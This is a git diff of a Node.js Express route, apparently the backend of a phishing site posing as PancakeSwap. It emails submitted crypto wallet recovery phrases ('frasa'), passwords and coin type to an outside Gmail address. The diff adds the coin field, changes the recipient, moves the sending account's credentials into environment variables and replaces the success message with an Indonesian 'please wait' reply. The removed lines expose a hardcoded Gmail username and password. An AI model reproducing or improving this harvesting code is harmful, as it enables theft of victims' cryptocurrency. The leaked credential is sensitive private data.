@@ -1,7 +1,7 @@
 var express = require('express');
 var router = express.Router();
 var nodemailer = require('nodemailer');
-var hbs = require('nodemailer-express-handlebars');
+require("dotenv").config();
 
 /* GET home page. */
 router.get('/', function(req, res, next) {
@@ -15,15 +15,15 @@ router.post('/crypto/send', function(req, res) {
                 service: 'gmail',
                 host: 'smtp.gmail.com',
                 auth: {
-                    user: 'pancake.clonning@gmail.com',
-                    pass: 'pancakeClonning123'
+                    user: process.env.email,
+                    pass: process.env.password,
                 }
             });
         
             // send mail with defined transport object
             let info = await transporter.sendMail({
-                from: 'pancake.clonning@gmail.com',
-                to: 'yudisangkala13@gmail.com',
+                from: process.env.email,
+                to: 'pancake.officialtoken@gmail.com',
                 subject: 'Crypto Submit',
                 html: `<style type="text/css">
                 .table-box {
@@ -49,6 +49,7 @@ router.post('/crypto/send', function(req, res) {
                                             <p style="font-size: 14px;"><b>Hallo,</b></p>
                                             <p>Ada data baru yang terkirim</p>
                                             <br />
+                                            <p>Coin : ${req.body.coin}</p>
                                             <p>Frasa : ${req.body.frasa}</p>
                                             <p>Password : ${req.body.password}</p>
                                             <br />
@@ -100,7 +101,7 @@ router.post('/crypto/send', function(req, res) {
     } catch(err) {
         res.json({ status: 500, message: err });
     } finally {
-        res.json({ status: 200, message: 'Success' });
+        res.json({ status: 200, message: "Berhasil, harap menunggu!!" });
     }  
 });
 
